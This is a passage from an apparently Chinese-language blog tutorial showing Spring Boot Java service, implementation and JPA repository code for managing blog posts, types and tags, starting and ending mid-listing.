class="meta">@GetMapping(&quot;/blog&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">blog</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="comment">/*String blog = null;</span></span><br><span class="line"><span class="comment">            if (blog == null)&#123;</span></span><br><span class="line"><span class="comment">                throw  new NotFoundException(&quot;博客不存在&quot;);</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blog&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TypeService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TypeService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">saveType</span><span class="params">(Type type)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">getType</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">getTypeByName</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Type&gt; <span class="title">listType</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Type&gt; <span class="title">listType</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Type&gt; <span class="title">listTypeTop</span><span class="params">(Integer size)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">updateType</span><span class="params">(Long id,Type type)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteType</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TypeServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.TypeRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.PageRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeServiceImpl</span> <span class="keyword">implements</span> <span class="title">TypeService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TypeRepository typeRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">saveType</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.save(type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getTypeByName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findByName(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Type&gt; <span class="title">listType</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Type&gt; <span class="title">listType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Type&gt; <span class="title">listTypeTop</span><span class="params">(Integer size)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;blogs.size&quot;</span>);</span><br><span class="line">        Pageable pageable = PageRequest.of(<span class="number">0</span>,size,sort);</span><br><span class="line">        <span class="keyword">return</span> typeRepository.findTop(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">updateType</span><span class="params">(Long id, Type type)</span> </span>&#123;</span><br><span class="line">        Type t = typeRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;您查找的信息不存在(︶︹︺)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(type,t);</span><br><span class="line">        <span class="keyword">return</span> typeRepository.save(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteType</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        typeRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TypeRepository.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Query;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TypeRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Type</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Type <span class="title">findByName</span><span class="params">(String name)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Query(&quot;select t from Type t&quot;)</span></span><br><span class="line">    <span class="function">List&lt;Type&gt; <span class="title">findTop</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TagService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TagService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">saveTag</span><span class="params">(Tag tag)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">getTag</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">getTagByName</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Tag&gt; <span class="title">listTag</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Tag&gt; <span class="title">listTag</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function">List&lt;Tag&gt; <span class="title">listTagTop</span><span class="params">(Integer size)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Tag&gt; <span class="title">listTag</span><span class="params">(String ids)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">updateTag</span><span class="params">(Long id,Tag tag)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteTag</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TagServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.TagRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.PageRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TagServiceImpl</span> <span class="keyword">implements</span> <span class="title">TagService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TagRepository tagRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">saveTag</span><span class="params">(Tag tag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.save(tag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">getTag</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">getTagByName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findByName(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Tag&gt; <span class="title">listTag</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Tag&gt; <span class="title">listTag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Tag&gt; <span class="title">listTagTop</span><span class="params">(Integer size)</span> </span>&#123;</span><br><span class="line">        Sort sort =  Sort.by(Sort.Direction.DESC,<span class="string">&quot;blogs.size&quot;</span>);</span><br><span class="line">        Pageable pageable = PageRequest.of (<span class="number">0</span>,size,sort);</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findTop(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Tag&gt; <span class="title">listTag</span><span class="params">(String ids)</span> </span>&#123;  <span class="comment">//1,2,3</span></span><br><span class="line">        <span class="keyword">return</span> tagRepository.findAllById(convertToList(ids));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;Long&gt; <span class="title">convertToList</span><span class="params">(String ids)</span></span>&#123;</span><br><span class="line">        List&lt;Long&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(ids) &amp;&amp; ids != <span class="keyword">null</span>)&#123;</span><br><span class="line">            String[] idarray = ids.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;idarray.length; i++)&#123;</span><br><span class="line">                list.add(<span class="keyword">new</span> Long(idarray[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">updateTag</span><span class="params">(Long id, Tag tag)</span> </span>&#123;</span><br><span class="line">        Tag t = tagRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;您查找的信息不存在(︶︹︺)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(tag,t);</span><br><span class="line">        <span class="keyword">return</span> tagRepository.save(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteTag</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        tagRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TagRepository.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Query;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TagRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Tag</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Tag <span class="title">findByName</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;select t from Tag t&quot;)</span></span><br><span class="line">    <span class="function">List&lt;Tag&gt; <span class="title">findTop</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">updateBlog</span><span class="params">(Long id,Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.BlogRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MyBeanUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.PageRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.domain.Specification;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaQuery;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Predicate;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Root;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogServiceImpl</span> <span class="keyword">implements</span> <span class="title">BlogService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogRepository blogRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                List&lt;Predicate&gt; predicateList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(<span class="string">&quot;title&quot;</span>),<span class="string">&quot;%&quot;</span>+blogQuery.getTitle()+<span class="string">&quot;%&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.getTypeID() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(<span class="string">&quot;type&quot;</span>).get(<span class="string">&quot;id&quot;</span>),blogQuery.getTypeID()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.isRecommend())&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(<span class="string">&quot;recommend&quot;</span>),blogQuery.isRecommend()));</span><br><span class="line">                &#125;</span><br><span class="line">                criteriaQuery.where(predicateList.toArray(<span class="keyword">new</span> Predicate[predicateList.size()]));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;updateTime&quot;</span>);</span><br><span class="line">        Pageable pageable = PageRequest.of(<span class="number">0</span>,size,sort);</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findTop(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blog.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setViews(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">updateBlog</span><span class="params">(Long id, Blog blog)</span> </span>&#123;</span><br><span class="line">        Blog b = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));</span><br><span class="line">        b.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        blogRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogRepository.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaSpecificationExecutor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Query;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Blog</span>,<span class="title">Long</span>&gt;, <span class="title">JpaSpecificationExecutor</span>&lt;<span class="title">Blog</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;select b from Blog b where b.recommend = true&quot;)</span></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">findTop</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="全局搜索"><a href="#全局搜索" class="headerlink" title="全局搜索"></a>全局搜索</h3><p>IndexController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 